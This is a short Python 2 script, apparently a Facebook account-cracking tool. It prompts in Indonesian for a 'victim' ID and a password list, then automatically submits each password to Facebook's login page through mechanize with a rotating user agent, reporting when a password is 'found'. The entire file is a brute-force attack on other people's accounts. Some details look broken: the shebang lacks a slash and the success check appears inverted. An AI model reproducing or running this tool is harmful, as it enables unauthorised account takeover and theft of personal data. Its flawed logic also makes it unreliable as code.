#!usr/bin/python

import sys
import random
import mechanize
import cookielib


GHT = '''
'''


email = str(raw_input(" \033[1;32m[?] Masukan ID Korban : \033[1;33m"))
passwordlist = str(raw_input("\033[1;32m [?] List Password.txt :\033[1;33m "))

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]



login = 'https://www.facebook.com/login.php?login_attempt=1'
def attack(password):

  try:
     sys.stdout.write("\r => trying\033[1;33m %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)

      
         
     ##Facebook
     br.form['email'] =email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     if log == login:
        print "\n\n \033[1;32m=> Password found .. !!"
        print "\n \033[1;32m [*] Password =>\033[1;33m %s\n" % (password)
        sys.exit(1)
  except KeyboardInterrupt:
        print "\n  => Exiting program .. "
        sys.exit(1)

def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))



def check():

    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n[*] Exiting program ..\n"
       sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\n \033[1;31m[*] Error: check your password list path \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n \033[1;31m[*] Exiting program ..\n"
        sys.exit(1)
    try:
        print GHT
        print "\033[1;32m [*] Account to crack :\033[1;33m %s" % (email)
        print "\033[1;32m [*] Loaded :\033[1;33m" , len(passwords), "passwords"
        print "\033[1;32m [*] Cracking, please wait ..."
    except KeyboardInterrupt:
        print "\n\033[1;31m [*] Exiting program ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)

if __name__ == '__main__':
    check()
